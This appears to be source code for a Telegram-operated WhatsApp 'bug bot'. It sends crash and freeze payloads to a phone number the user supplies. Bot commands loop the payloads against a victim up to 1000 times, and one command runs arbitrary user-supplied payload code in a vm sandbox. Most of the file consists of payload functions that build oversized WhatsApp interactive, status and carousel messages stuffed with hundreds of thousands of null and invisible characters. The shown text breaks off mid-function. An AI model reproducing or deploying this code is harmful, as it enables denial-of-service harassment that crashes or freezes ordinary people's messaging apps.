bot.command("androdelay", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /androdelay 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `<blockquote>「 𝐁𝐔𝐆 𝐁𝐎𝐓 ☇ 𝐁𝐮𝐠˚𝐒𝐲𝐬𝐭𝐞𝐦🦠 」
╰➤ Sending Exploit...
 ⬡ Target: ${q}
 ⬡ Status: Process
 ⬡ Type: androdelay
</blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "𝐂𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}`, style: "success" }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 90; i++) {
    await DelayAyaa(sock, target);
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `<blockquote>「 𝐁𝐔𝐆 𝐁𝐎𝐓 ☇ 𝐁𝐮𝐠˚𝐒𝐲𝐬𝐭𝐞𝐦🦠 」
╰➤ Exploit Sent Successfully...
 ⬡ Target: ${q}
 ⬡ Status: Success
 ⬡ Type: androdelay
</blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "𝐂𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}`, style: "success" }
      ]]
    }
  });
});

bot.command("androdela", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /androdela 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `<blockquote>「 𝐁𝐔𝐆 𝐁𝐎𝐓 ☇ 𝐁𝐮𝐠˚𝐒𝐲𝐬𝐭𝐞𝐦🦠 」
╰➤ Sending Exploit...
 ⬡ Target: ${q}
 ⬡ Status: Process
 ⬡ Type: androdela
</blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "𝐂𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}`, style: "success" }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 70; i++) {
    await LexcaabosV4(sock, target);
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `<blockquote>「 𝐁𝐔𝐆 𝐁𝐎𝐓 ☇ 𝐁𝐮𝐠˚𝐒𝐲𝐬𝐭𝐞𝐦🦠 」
╰➤ Exploit Sent Successfully...
 ⬡ Target: ${q}
 ⬡ Status: Success
 ⬡ Type: androdela
</blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "𝐂𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}`, style: "success" }
      ]]
    }
  });
});

bot.command("forclose", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /forclose 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `<blockquote>「 𝐁𝐔𝐆 𝐁𝐎𝐓 ☇ 𝐁𝐮𝐠˚𝐒𝐲𝐬𝐭𝐞𝐦🦠 」
╰➤ Sending Exploit...
 ⬡ Target: ${q}
 ⬡ Status: Process
 ⬡ Type: foreclose
</blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "𝐂𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}`, style: "success" }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 300; i++) {
    await forclose(sock, target);
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `<blockquote>
「𝐁𝐔𝐆 𝐁𝐎𝐓 ☇ 𝐁𝐮𝐠˚𝐒𝐲𝐬𝐭𝐞𝐦🦠」
 ╰➤ Exploit Sent Successfully...
    ⬡ Target: ${q}
    ⬡ Status: Success
    ⬡ Type: forclose
</blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "𝐂𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}`, style: "success" }
      ]]
    }
  });
});

bot.command("xcombo", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /xcombo 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `<blockquote>「 𝐁𝐔𝐆 𝐁𝐎𝐓 ☇ 𝐁𝐮𝐠˚𝐒𝐲𝐬𝐭𝐞𝐦🦠 」
╰➤ Sending Exploit...
 ⬡ Target: ${q}
 ⬡ Status: Process
 ⬡ Type: xcombo
</blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "𝐂𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}`, style: "success" }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 100; i++) {
    await blanks(sock, target);
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `<blockquote>「 𝐁𝐔𝐆 𝐁𝐎𝐓 ☇ 𝐁𝐮𝐠˚𝐒𝐲𝐬𝐭𝐞𝐦🦠 」
╰➤ Exploit Sent Successfully...
 ⬡ Target: ${q}
 ⬡ Status: Success
 ⬡ Type: xcombo
</blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "𝐂𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}`, style: "success" }
      ]]
    }
  });
});

bot.command("delade", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /delade 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `<blockquote>「 𝐁𝐔𝐆 𝐁𝐎𝐓 ☇ 𝐁𝐮𝐠˚𝐒𝐲𝐬𝐭𝐞𝐦🦠 」
╰➤ Sending Exploit...
 ⬡ Target: ${q}
 ⬡ Status: Process
 ⬡ Type: delade
</blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "𝐂𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}`, style: "success" }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 80; i++) {
    await LexcaabosV3(sock, target);
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `<blockquote>「 𝐁𝐔𝐆 𝐁𝐎𝐓 ☇ 𝐁𝐮𝐠˚𝐒𝐲𝐬𝐭𝐞𝐦🦠 」
╰➤ Exploit Sent Successfully...
 ⬡ Target: ${q}
 ⬡ Status: Success
 ⬡ Type: delade
</blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "𝐂𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}`, style: "success" }
      ]]
    }
  });
});

bot.command("androdelaynew", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /androdelaynew 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `<blockquote>「 𝐁𝐔𝐆 𝐁𝐎𝐓 ☇ 𝐁𝐮𝐠˚𝐒𝐲𝐬𝐭𝐞𝐦🦠 」
╰➤ Sending Exploit...
 ⬡ Target: ${q}
 ⬡ Status: Process
 ⬡ Type: androdelaynew
</blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "𝐂𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}`, style: "success" }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 1000; i++) {
    await delayinvisxfreeze(sock, target);
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `<blockquote>「 𝐁𝐔𝐆 𝐁𝐎𝐓 ☇ 𝐁𝐮𝐠˚𝐒𝐲𝐬𝐭𝐞𝐦🦠 」
╰➤ Exploit Sent Successfully...
 ⬡ Target: ${q}
 ⬡ Status: Success
 ⬡ Type: androdelaynew
</blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "𝐂𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}`, style: "success" }
      ]]
    }
  });
});


bot.command("testfunction", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
    try {
      const args = ctx.message.text.split(" ")
      if (args.length < 3)
        return ctx.reply("🪧 ☇ Format: /testfunction 62××× 10 (reply with a function)")

      const q = args[1]
      const jumlah = Math.max(0, Math.min(parseInt(args[2]) || 1, 1000))
      if (isNaN(jumlah) || jumlah <= 0)
        return ctx.reply("❌ ☇ Amount must be a number")

      const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
      if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.text)
        return ctx.reply("❌ ☇ Reply with a function")

      const processMsg = await ctx.telegram.sendPhoto(
        ctx.chat.id,
        { url: thumbnailUrl },
        {
          caption: `<blockquote>「 𝐁𝐔𝐆 𝐁𝐎𝐓 ☇ 𝐁𝐮𝐠˚𝐒𝐲𝐬𝐭𝐞𝐦🦠 」
╰➤ Sending Exploit...
 ⬡ Target: ${q}
 ⬡ Status: Process
 ⬡ Type: Unknown Exploit
</blockquote>`,
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [{ text: "𝐂𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}`, style: "success" }]
            ]
          }
        }
      )
      const processMessageId = processMsg.message_id

      const safeSock = createSafeSock(sock)
      const funcCode = ctx.message.reply_to_message.text
      const match = funcCode.match(/async function\s+(\w+)/)
      if (!match) return ctx.reply("❌ ☇ Invalid function")
      const funcName = match[1]

      const sandbox = {
        console,
        Buffer,
        sock: safeSock,
        target,
        sleep,
        generateWAMessageFromContent,
        generateForwardMessageContent,
        generateWAMessage,
        prepareWAMessageMedia,
        proto,
        jidDecode,
        areJidsSameUser
      }
      const context = vm.createContext(sandbox)

      const wrapper = `${funcCode}\n${funcName}`
      const fn = vm.runInContext(wrapper, context)

      for (let i = 0; i < jumlah; i++) {
        try {
          const arity = fn.length
          if (arity === 1) {
            await fn(target)
          } else if (arity === 2) {
            await fn(safeSock, target)
          } else {
            await fn(safeSock, target, true)
          }
        } catch (err) {}
        await sleep(200)
      }

      const finalText = `<blockquote>「 𝐁𝐔𝐆 𝐁𝐎𝐓 ☇ 𝐁𝐮𝐠˚𝐒𝐲𝐬𝐭𝐞𝐦🦠 」
╰➤ Exploit Sent Successfully...
 ⬡ Target: ${q}
 ⬡ Status: Success
 ⬡ Type: Unknown Exploit
</blockquote>`;
      try {
        await ctx.telegram.editMessageCaption(
          ctx.chat.id,
          processMessageId,
          undefined,
          finalText,
          {
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [{ text: "𝐂𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}`, style: "success" }]
              ]
            }
          }
        )
      } catch (e) {
        await ctx.replyWithPhoto(
          { url: thumbnailUrl },
          {
            caption: finalText,
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [{ text: "𝐂𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}`, style: "success" }]
              ]
            }
          }
        )
      }
    } catch (err) {}
  }
)



//FUNC AMPAS LO TARO DISINI
async function Rena4YouDelayInvisHard(sock, target) {
    try {
        const msg1 = {
            groupStatusMessageV2: {
                message: {
                    interactiveMessage: {
                        body: {
                            text: " "
                        },
                        nativeFlowMessage: {
                            buttons: "\u0000" + "\u3164".repeat(500000),
                            nativeFlowResponseMessage: {
                                buttons: Array.from({ length: 123456 }, () => ({}))
                            }
                        }
                    }
                }
            }
        };
        
        await sock.relayMessage(target, msg1, { noselfSync: true });
        
        const msg2 = {
            groupStatusMessageV2: {
                message: {
                    interactiveMessage: {
                        body: {
                            text: " "
                        },
                        nativeFlowMessage: {
                            buttons: "\u0000" + "\u3164".repeat(500000),
                            nativeFlowResponseMessage: {
                                buttons: Array.from({ length: 123456 }, () => ({}))
                            }
                        }
                    }
                }
            }
        };
        
        await sock.relayMessage(target, msg2, { noselfSync: true });
        
        const msg3 = {
            groupStatusMessageV2: {
                message: {
                    interactiveMessage: {
                        body: {
                            text: " "
                        },
                        nativeFlowMessage: {
                            buttons: "\u0000" + "\u3164".repeat(500000),
                            nativeFlowResponseMessage: {
                                buttons: Array.from({ length: 123456 }, () => ({}))
                            }
                        }
                    }
                }
            }
        };
        
        await sock.relayMessage(target, msg3, { noselfSync: true });
        
    } catch (error) {
        console.error("❌ Error:", error);
    }
}

async function Rena4YouBlank(target) {
    const msg = {
        messageType: 3,
        mediaMetadata: {},
        Livelocationmesaage: {},
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "Rena4YouAttack"
                    },
                    nativeFlowMessage: {
                        extra: "\u31040",
                        buttons: "A".repeat(60000),
                        extra1: "\u0000".repeat(5555) + "\u0000",
                        name: "catalog_mesaage",
                        extra2: "\u0000",
                        extra3: "\u0000",
                        extra4: "\u0000",
                        extra5: "\u0000",
                        carouselMessage: {
                            cards: [
                                {
                                    cardIdentifier: "card_1",
                                    cardType: 1,
                                    components: [
                                        {
                                            type: "hatam",
                                            text: "RenaIsHere"
                                        },
                                        {
                                            type: "23",
                                            text: "kartu0000"
                                        },
                                        {
                                            type: "0927383",
                                            text: "dananumber"
                                        },
                                        {
                                            type: "buttons",
                                            buttons: [
                                                {
                                                    name: "quick_reply",
                                                    buttonParamsJson: JSON.stringify({
                                                        display_text: "Klik"
                                                    })
                                                }
                                            ]
                                        }
                                    ]
                                },
                                {
                                    cardIdentifier: "card_2",
                                    cardType: 1,
                                    components: [
                                        {
                                            type: "header",
                                            text: "Rena¿•°🎐"
                                        },
                                        {
                                            type: "paymet",
                                            text: "Rena4You Attack"
                                        }
                                    ]
                                }
                            ]
                        }
                    }
                }
            }
        }
    }

    await sock.relayMessage(target, msg, { noselfSync: true })

    const msg1 = {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "\u0000".repeat(50000) + "Rena4You𑇂𑆵𑆴𑆿" + "\u0000".repeat(50000)
                    },
                    nativeFlowMessage: {
                        extra: "\u0000".repeat(50000),
                        buttons: "A".repeat(20000)
                    }
                }
            }
        }
    };

    await sock.relayMessage(target, msg1, {
        noselfSync: true
    });

    const msg2 = {
        interactiveMessage: {
            body: {
                text: "Rena4You𑇂𑆵𑆴𑆿"
            },
            nativeFlowMessage: {
                buttons: Array.from({ length: 500000 }, () => ({}))
            }
        }
    };

    await sock.relayMessage(target, msg2, {
        noselfSync: true
    });

    const msg3 = {
        interactiveMessage: {
            body: {
                text: "Rena4You𑇂𑆵𑆴𑆿𑆿"
            },
            nativeFlowMessage: {
                buttons: Array.from({ length: 1000 }, () => ({}))
            },
            contextInfo: {
                mentionedJid: Array.from({ length: 2000 }, () =>
                    Math.floor(Math.random() * 9000000000) + "@s.whatsapp.net"
                ),
                forwardingScore: 999999999,
                isForwarded: true
            }
        }
    };

    await sock.relayMessage(target, msg3, {
        noselfSync: true
    });

    const message = {
        interactiveMessage: {
            body: {
                text: "\u0000".repeat(60000)
            },
            nativeFlowMessage: {
                buttons: "view_ai_message".repeat(30000)
            }
        }
    };

    await sock.relayMessage(target, message, {
        noselfSync: true
    });
}

async function Faiqanjay(sock, target) {
  try {
    const msg = generateWAMessageFromContent(target, {
      locationMessage: {
        name: "(@RealsFaiuqOffc)" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000),
        address: "𑇂𑆵𑆴𑆿𑆿".repeat(15000)
      }
    }, {});
    await sock.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id, statusJidList: [target], additionalNodes: [{
        tag: "meta", attrs: {}, content: [{
          tag: "mentioned_users", attrs: {}, content: [{
            tag: "to", attrs: { jid: target }, content: undefined
          }]
        }]
      }]
    });
  } catch (error) {
    console.log("error: ", error);
  }
}

async function Rena4YouBlankNoClick(sock, target) {
    const msg = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "\0".repeat(40000),
                        format: "DEFAULT"
                    },
                    footer: {
                        text: "\0".repeat(40000)
                    },
                    header: {
                        title: "/",
                        subtitle: "@Meta_Ai",
                        hasMedia: false
                    },
                    nativeFlowMessage: {
                        buttons: [
                            {
                                name: "call_permission_request",
                                paramsJson: "\u0000".repeat(35000)
                            },
                            {
                                name: "galaxy_message",
                                paramsJson: "\x00".repeat(10000)
                            }
                        ],
                        messageVersion: 3
                    }
                }
            },
            contextInfo: {
                isForwarded: true,
                forwardingScore: 9999,
                forwardOrigin: 4,
                deviceListMetadataVersion: 2,
                messageId: null
            }
        }
    };

    await sock.relayMessage(target, msg, {
        noSelfSync: true
    });
   
   const msg1 = {
      interactiveMessage: {
        body: {
          text: "\u200C".repeat(20000),
        },
        nativeFlowMessage: {
          buttons: "\u0000".repeat(20000),
          encryptedParams: {
            value: "\u2066".repeat(20000),
          },
        },
      },
    };

    const msg2 = {
      interactiveMessage: {
        body: {
          text:
            "@Meta_Ai" +
            "\u200B".repeat(10000) +
            "\uFEFF".repeat(20000),
        },
        nativeFlowMessage: {
          buttons: "meta_ai_reiviw".repeat(20000),
        },
      },
    };
await sock.relayMessage(target, msg1, { noselfSync: true });
await sock.relayMessage(target, msg2, { noselfSync: true });

    await sock.relayMessage(target, {
            interactiveMessage: {
                body: { text: "\u0000".repeat(30000) + "ြ".repeat(20000) },
                nativeFlowMessage: {
                    buttons: Array.from({ length: 300000 }, () => ({}))
                }
            }
        }, { noselfSync: true });
        await sock.relayMessage(target, {
            extendedTextMessage: {
                text: "\u200B".repeat(30000) + "\u0000".repeat(30000),
                contextInfo: { mentionedJid: [target] }
            }
        }, { noselfSync: true });
}

async function Rena4YouDelayInvis(sock, target) {
    try {
        const msg1 = {
            groupStatusMessageV2: {
                message: {
                    interactiveMessage: {
                        body: {
                            text: " "
                        },
                        nativeFlowMessage: {
                            buttons: "\u0000" + "\u3164".repeat(500000),
                            nativeFlowResponseMessage: {
                                buttons: Array.from({ length: 123456 }, () => ({}))
                            }
                        }
                    }
                }
            }
        };
        
        await sock.relayMessage(target, msg1, {});
        
        const msg2 = {
            groupStatusMessageV2: {
                message: {
                    interactiveMessage: {
                        body: {
                            text: " "
                        },
                        nativeFlowMessage: {
                            buttons: "\u0000" + "\u3164".repeat(500000),
                            nativeFlowResponseMessage: {
                                buttons: Array.from({ length: 123456 }, () => ({}))
                            }
                        }
                    }
                }
            }
        };
        
        await sock.relayMessage(target, msg2, {});
        
        const msg3 = {
            groupStatusMessageV2: {
                message: {
                    interactiveMessage: {
                        body: {
                            text: " "
                        },
                        nativeFlowMessage: {
                            buttons: "\u0000" + "\u3164".repeat(500000),
                            nativeFlowResponseMessage: {
                                buttons: Array.from({ length: 123456 }, () => ({}))
                            }
                        }
                    }
                }
            }
        };
        
        await sock.relayMessage(target, msg3, {});
        
        const msg6 = {
            groupStatusMessageV2: {
                message: {
                    interactiveMessage: {
                        body: {
                            text: " "
                        },
                        nativeFlowMessage: {
                            buttons: "\u0000" + "\u3164".repeat(500000),
                            nativeFlowResponseMessage: {
                                buttons: Array.from({ length: 123456 }, () => ({}))
                            }
                        }
                    }
                }
            }
        };
        
        await sock.relayMessage(target, msg6, {});
        
        const msg4 = {
            groupStatusMessageV2: {
                message: {
                    interactiveMessage: {
                        body: {
                            text: " "
                        },
                        nativeFlowMessage: {
                            buttons: "\u0000" + "\u3164".repeat(500000),
                            nativeFlowResponseMessage: {
                                buttons: Array.from({ length: 123456 }, () => ({}))
                            }
                        }
                    }
                }
            }
        };
        
        await sock.relayMessage(target, msg4, {});
        
        const msg5 = {
            groupStatusMessageV2: {
                message: {
                    interactiveMessage: {
                        body: {
                            text: " "
                        },
                        nativeFlowMessage: {
                            buttons: "\u0000" + "\u3164".repeat(500000),
                            nativeFlowResponseMessage: {
                                buttons: Array.from({ length: 123456 }, () => ({}))
                            }
                        }
                    }
                }
            }
        };
        
        await sock.relayMessage(target, msg5, {});
        
    } catch (error) {
        console.error("❌ Error:", error);
    }
}

async function Rena4YouDelayInvis(sock, target) {
    try {
        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                interactiveMessage: {
                    body: { text: "Rena Is HereC‌⃰ꪸ⃟" },
                    nativeFlowMessage: {
                        buttons: "?".repeat(50000)
                    }
                }
            }
        }, { participant: { jid: target } });

        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                message: {
                    interactiveMessage: {
                        body: { text: "\0" },
                        nativeFlowMessage: {
                            buttons: "?".repeat(50000)
                        }
                    }
                }
            }
        }, { participant: { jid: target } });

        const imageMessage = {
            url: "https://mmg.whatsapp.net/o1/v/t24/f2/m233/AQNvaZ3Ct44hmtUdO06rYfwhlUk56KEtQ-CV0JL3bg-qPUdYT7vz6p7KtHbhFEXeBTsRKz01FTxydRdiMW88ynk1TRpQcVAm76Lb_ZIDKw?ccb=9-4&oh=01_Q5Aa4AHnhpSyXU1dhNgWvLCbzU4XEfA9JZ1HffIt6U6zDH_QMg&oe=69F44EB9&_nc_sid=e6ed6c&mms3=true",
            mimetype: "image/jpeg",
            fileSha256: "WMATZulCqZloXFfBTYPzATm2v74jGJv7thxNE7C8X8o=",
            fileLength: 162903,
            height: 1080,
            width: 1080,
            mediaKey: "qR4aFXwJdZbH0Zgi7uxA5Y4to6eJjhKD2V5mhn/ZQrc=",
            fileEncSha256: "JDCO/kG+BT0CCdsRsdKSixsDleGaJNZPCJMVomLox3A=",
            directPath: "/o1/v/t24/f2/m233/AQNvaZ3Ct44hmtUdO06rYfwhlUk56KEtQ-CV0JL3bg-qPUdYT7vz6p7KtHbhFEXeBTsRKz01FTxydRdiMW88ynk1TRpQcVAm76Lb_ZIDKw?ccb=9-4&oh=01_Q5Aa4AHnhpSyXU1dhNgWvLCbzU4XEfA9JZ1HffIt6U6zDH_QMg&oe=69F44EB9&_nc_sid=e6ed6c",
            mediaKeyTimestamp: 1775033718,
            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAvAAEAAwEBAQAAAAAAAAAAAAAAAQIDBAUGAQEBAQEAAAAAAAAAAAAAAAAAAQID/9oADAMBAAIQAxAAAAD58BctFpKNM0lAdfIt7o4ra13UxyjrwxAZxaaC952s5u7OkdlvHY37Dy0ZDpmyosqAISAAAEAB/8QAJxAAAgECBQMEAwAAAAAAAAAAAQIAAxEEEiAhMRATMhQiQVEVMFP/2gAIAQEAAT8A/X23sDlMNOoNypnbfb2mGk4NipnaqZb5TooFKd3aDGEArlBEOMbKQBGxzMqgoNocWTyonrG2EqqNiDzpVSxsIQX2C8cQqy8qdARjaBVHLQso4X4mdkGxsSIKrhg19xPXMLB0DCCvganlTsYMLg6ng8/G0/6zf76U6JexBEIJ3NNYadgTkWOCaY9qgTiAkcGCvVA8z1DFYXb7mZvuBj020nUYPnQTB0M//8QAIxEBAAIAAwkBAAAAAAAAAAAAAQACERASIBAxQVETcZGhsf/aAAgBAgEBPwDhHBxm/bzG9jWNlOe0iVe4MyqaNq/GZT77fk6f/8QAIBEAAQMDBQEAAAAAAAAAAAAAAQACERASUQMTMFKRkv/aAAgBAwEBPwBQVFWm0ytx+UHvIReSINTS9/b0Sr3Y0/nj/9k=",
            contextInfo: { pairedMediaType: "NOT_PAIRED_MEDIA" },
            scansSidecar: "2YCrK9uS0xGWeOGhQDDtgHrmdhks+9aRYU2v5pwgTYmXkWbuXBRpzg==",
            scanLengths: [10365, 39303, 40429, 72806],
            midQualityFileSha256: "lldAKS/9qixXmMdTvk0n/DUV7WJLwvT6BaZmOkbUDdE="
        };

        const cards = [];
        for (let z = 0; z < 600; z++) {
            cards.push({
                header: { imageMessage, hasMediaAttachment: true },
                nativeFlowMessage: { buttons: "\n".repeat(500000) }
            });
        }

        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                message: {
                    interactiveMessage: {
                        body: { text: "\0" },
                        carouselMessage: { cards }
                    }
                }
            }
        }, { participant: { jid: target } });

        for (let i = 0; i < 3; i++) {
            await sock.relayMessage(target, {
                groupStatusMessageV2: {
                    message: {
                        interactiveMessage: {
                            body: { text: " " },
                            nativeFlowMessage: {
                                buttons: "\u0000" + "\u3164".repeat(500000),
                                nativeFlowResponseMessage: {
                                    buttons: Array.from({ length: 123456 }, () => ({}))
                                }
                            }
                        }
                    }
                }
            }, { participant: { jid: target } });
        }

        console.log(`✅ Rena4YouDelayInvis sent to ${target}`);
        return { success: true, target };

    } catch (error) {
        console.error('❌ Rena4YouDelayInvis Error:', error.message);
        return { success: false, error: error.message };
    }
}

async function Rena4YouEfceh(sock, target) {
    const msg = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "\0".repeat(40000),
                        format: "DEFAULT"
                    },
                    footer: {
                        text: "\0".repeat(40000)
                    },
                    header: {
                        title: "/",
                        subtitle: "@Meta_Ai",
                        hasMedia: false
                    },
                    nativeFlowMessage: {
                        buttons: [
                            {
                                name: "call_permission_request",
                                paramsJson: "\u0000".repeat(35000)
                            },
                            {
                                name: "galaxy_message",
                                paramsJson: "\x00".repeat(10000)
                            }
                        ],
                        messageVersion: 3
                    }
                }
            },
            contextInfo: {
                isForwarded: true,
                forwardingScore: 9999,
                forwardOrigin: 4,
                deviceListMetadataVersion: 2,
                messageId: null
            }
        }
    };

    await sock.relayMessage(target, msg, {
        noSelfSync: true
    });
   
   const msg1 = {
      interactiveMessage: {
        body: {
          text: "\u200C".repeat(20000),
        },
        nativeFlowMessage: {
          buttons: "\u0000".repeat(20000),
          encryptedParams: {
            value: "\u2066".repeat(20000),
          },
        },
      },
    };

    const msg2 = {
      interactiveMessage: {
        body: {
          text:
            "@Meta_Ai" +
            "\u200B".repeat(10000) +
            "\uFEFF".repeat(20000),
        },
        nativeFlowMessage: {
          buttons: "meta_ai_reiviw".repeat(20000),
        },
      },
    };
await sock.relayMessage(target, msg1, {});
await sock.relayMessage(target, msg2, {});

    await sock.relayMessage(target, {
            interactiveMessage: {
                body: { text: "\u0000".repeat(30000) + "ြ".repeat(20000) },
                nativeFlowMessage: {
                    buttons: Array.from({ length: 300000 }, () => ({}))
                }
            }
        }, {});
        await sock.relayMessage(target, {
            extendedTextMessage: {
                text: "\u200B".repeat(30000) + "\u0000".repeat(30000),
                contextInfo: { mentionedJid: [target] }
            }
        }, {});
   
   const renaoffc = await sock.relayMessage(target, {
    interactiveMessage: {
      header: {
        title: "0",
        subtitle: "0",
        hasMediaAttachment: true,
        locationMessage: {
          degreesLatitude: -98.6289790,
          degreesLongitude: 89.9821647,
          name: "x",
          address: "x"
        },
      },
      body: {
        text: "x",
      },
      footer: {
        text: "x",
      },
      nativeFlowMessage: {
        buttons: [
          {
            name: "single_select",
             buttonParamsJson: "{}",
          },
          {
           name: "cta_call",
            buttonParamsJson: JSON.stringify({
             display_text: "𑇂𑆵𑆴𑆿".repeat(5000),
              phone_Number: "00000000000"
            })
          },
          {
           nativeFlowMessage: {
              buttons: "Rena_nih_dek".repeat(30000),
               messageParamsJson: "{}"
            },
            name: 'address_message',
            buttonParamsJson: "\r",
          }
        ],
        messageParamsJson: '{}',
      },
    },
  });

 const renaoffc2 = await sock.relayMessage(target, {
    interactiveMessage: {
      header: {
        title: "0",
        subtitle: "0",
        hasMediaAttachment: true,
        locationMessage: {
          degreesLatitude: -98.6289790,
          degreesLongitude: 89.9821647,
          name: "x",
          address: "x"
        },
      },
      body: {
        text: "x",
      },
      footer: {
        text: "x",
      },
      nativeFlowMessage: {
        buttons: [
          {
            name: "single_select",
             buttonParamsJson: "{}",
          },
          {
           name: "cta_call",
            buttonParamsJson: JSON.stringify({
             display_text: "𑇂𑆵𑆴𑆿".repeat(5000),
              phone_Number: "00000000000"
            })
          },
          {
           nativeFlowMessage: {
              buttons: "Rena_nih_dek".repeat(30000),
